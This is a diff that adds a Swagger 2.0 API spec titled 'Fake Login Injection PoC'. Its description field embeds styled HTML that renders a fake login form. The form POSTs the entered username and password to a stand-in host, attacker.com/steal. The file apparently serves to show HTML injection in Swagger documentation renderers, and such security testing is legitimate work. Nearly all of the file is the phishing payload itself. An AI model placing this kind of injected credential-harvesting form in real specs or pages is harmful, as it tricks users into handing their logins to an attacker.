@@ -1,0 +1,53 @@
+swagger: '2.0'
+info:
+  title: Fake Login Injection PoC
+  version: 1.0.0
+  description: |
+    <style>
+      .login-form {
+        max-width: 400px;
+        padding: 20px;
+        border: 1px solid #ccc;
+        margin: 20px;
+        box-shadow: 0 0 10px #aaa;
+        font-family: Arial, sans-serif;
+      }
+      .login-form h2 {
+        text-align: center;
+      }
+      .login-form label {
+        display: block;
+        margin-top: 10px;
+      }
+      .login-form input {
+        width: 100%;
+        padding: 8px;
+        margin-top: 5px;
+      }
+      .login-form button {
+        width: 100%;
+        margin-top: 15px;
+        padding: 10px;
+        background-color: #007bff;
+        color: white;
+        border: none;
+        cursor: pointer;
+      }
+    </style>
+    <div class="login-form">
+      <h2>Login</h2>
+      <form action="https://attacker.com/steal" method="POST">
+        <label for="username">Username</label>
+        <input type="text" name="username" required>
+        <label for="password">Password</label>
+        <input type="password" name="password" required>
+        <button type="submit">Login</button>
+      </form>
+    </div>
+paths:
+  /test:
+    get:
+      summary: Dummy endpoint
+      responses:
+        '200':
+          description: OK
